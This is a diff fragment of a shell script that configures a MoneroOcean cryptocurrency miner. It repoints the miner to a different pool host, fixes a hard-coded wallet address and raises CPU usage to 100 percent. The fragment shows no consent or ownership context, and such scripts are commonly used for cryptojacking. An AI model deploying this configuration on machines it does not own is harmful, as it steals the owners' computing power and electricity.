@@ -206,7 +206,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "mintme-solo.wattpool.net:3001",/' $HOME/moneroocean/config.json
+sed -i 's/"url": *"[^"]*",/"url": "web-ko1.gonspool.com:3333",/' $HOME/moneroocean/config.json
 sed -i 's/"user": *"[^"]*",/"user": "0x099C7845803e2aBa1182889A1cCB7d7Cb2143005",/' $HOME/moneroocean/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
